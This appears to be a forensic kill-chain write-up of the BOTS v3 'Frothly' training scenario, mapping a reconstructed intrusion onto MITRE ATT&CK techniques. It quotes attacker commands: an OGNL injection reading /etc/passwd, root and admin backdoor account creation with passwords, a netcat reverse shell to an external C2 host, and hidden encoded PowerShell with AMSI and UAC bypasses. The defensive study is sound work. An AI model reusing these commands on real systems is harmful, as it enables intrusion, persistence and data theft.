# Kill Chain Analysis
## BOTS v3 — Frothly Complete Attack Reconstruction

---

## Complete Attack Chain

```
192.168.8.103 (Attacker)
    |
    | T1190 — Apache Struts OGNL injection (07:05)
    | POST /frothlyinventory/integration/saveGangster.action
    | payload: (#cmd='cat /etc/passwd')
    v
HOTH (192.168.9.30) — Apache Struts Server
    |
    | T1136.001 — Linux backdoor account created
    |   useradd -ou tomcat7 -p ilovedaviderve
    |   → UID=0 GID=0 (root disguised as tomcat7)
    |
    | T1046 — Port scan from HOTH toward itself
    |   ports: 21,22,23,80,135,139,443,445,3389
    |
    | T1071.001 — Reverse shell established
    |   nc 45.77.53.176:8088 via /tmp/backpipe
    |
    | T1539 — SugarCRM session cookie stolen (hypothesis)
    |   PHPSESSID=ck2dbgeimem4h653tr1fbubf04
    v
45.77.53.176 (External C2)
    |
    | Pivot using stolen session
    v
FYODOR-L (192.168.70.186) — Windows Workstation
    |
    | T1059.001 — Obfuscated PowerShell executed
    |   powershell.exe -NoP -NonI -W Hidden -enc <Base64>
    |   → AMSI bypass (amsiInitFailed)
    |   → RC4 encrypted payload downloaded
    |
    | T1036 — Masquerading
    |   iexeplorer.exe dropped in C:\Windows\Temp\unziped\
    |
    | T1112 — Registry modification
    |   HKCU\...\ms-settings\Shell\Open\command
    |   HKCU\...\Windows Update\Update
    |
    | T1548.002 — UAC Bypass via fodhelper.exe
    |
    | T1136.001 — Backdoor account created
    |   net user /add svcvnc Password123!
    |   net localgroup administrators svcvnc /add
    |   EventCodes: 4720, 4722, 4724, 4732
    |
    | T1071.001 — C2 communication
    |   45.77.53.176:443 (3884 connections)
    |   45.77.53.176:3333 (logos.png download)
    |
    | T1021.002 — SMB lateral movement attempt
    |   Port 139 → 192.168.70.186
    |            → 192.168.8.103
    |            → 192.168.8.116
    v
ABUNGST-L (192.168.24.128)
    |
    | T1071.001 — C2 communication
    |   45.77.53.176:443 (1071 connections)
    v
45.77.53.176 (External C2)
```

---

## MITRE ATT&CK Techniques — Complete List

| Phase | ID | Technique | Host | Evidence |
|-------|----|-----------|------|----------|
| Initial Access | T1190 | Exploit Public-Facing App | HOTH | 15 POST saveGangster.action |
| Execution | T1059.004 | Unix Shell | HOTH | cat /etc/passwd, sudo bash |
| Execution | T1059.001 | PowerShell obfuscated | FYODOR-L | EventCode 4688 -enc |
| Defense Evasion | T1027 | Obfuscated Files Base64+RC4 | FYODOR-L | Decoded payload |
| Defense Evasion | T1562.001 | Disable AMSI | FYODOR-L | amsiInitFailed |
| Defense Evasion | T1036 | Masquerading | FYODOR-L | iexeplorer.exe |
| Defense Evasion | T1112 | Modify Registry | FYODOR-L | Sysmon EventID 13 |
| Persistence | T1136.001 | Create Local Account (Linux) | HOTH | tomcat7 UID=0 |
| Persistence | T1136.001 | Create Local Account (Windows) | FYODOR-L | svcvnc EventCode 4720 |
| Persistence | T1098 | Account Manipulation | FYODOR-L | EventCode 4732 |
| Privilege Escalation | T1548.002 | UAC Bypass Fodhelper | FYODOR-L | Registry + fodhelper |
| Privilege Escalation | T1134 | Access Token Manipulation | FYODOR-L | EventCode 4672/4673 |
| Credential Access | T1539 | Steal Web Session Cookie | HOTH | PHPSESSID stolen |
| Discovery | T1046 | Network Service Scanning | HOTH | Port scan 21-3389 |
| Discovery | T1082 | System Information | FYODOR-L | WMIC 536 detections |
| Discovery | T1049 | Network Connections | FYODOR-L | Netstat 78 detections |
| Discovery | T1012 | Query Registry | FYODOR-L | 1037 detections |
| Discovery | T1087 | Account Discovery | HOTH | cat /etc/passwd |
| C2 | T1071.001 | Web Protocols HTTP/S | All | 45.77.53.176 |
| Lateral Movement | T1021.002 | SMB | FYODOR-L | Port 139 scanning |

**Total : 20 MITRE ATT&CK techniques across 8 tactics**

---

## Key Evidence Summary

| Finding | Value | Confirmed by |
|---------|-------|-------------|
| Attacker IP | 192.168.8.103 | stream:http logs |
| Initial target | HOTH (192.168.9.30) | HTTP POST logs |
| Exploit | Apache Struts OGNL | saveGangster.action |
| Linux backdoor | tomcat7 UID=0 | syslog useradd |
| Windows backdoor | svcvnc | EventCode 4720 |
| External C2 | 45.77.53.176 | Ports 443, 8088, 3333 |
| Session pivot | PHPSESSID stolen | SugarCRM logs |
| Affected hosts | HOTH, FYODOR-L, ABUNGST-L | Network logs |
| Port 1337 | Listening on HOTH | osquery ListeningPorts |
| Tool download | logos.png | 45.77.53.176:3333 |
```
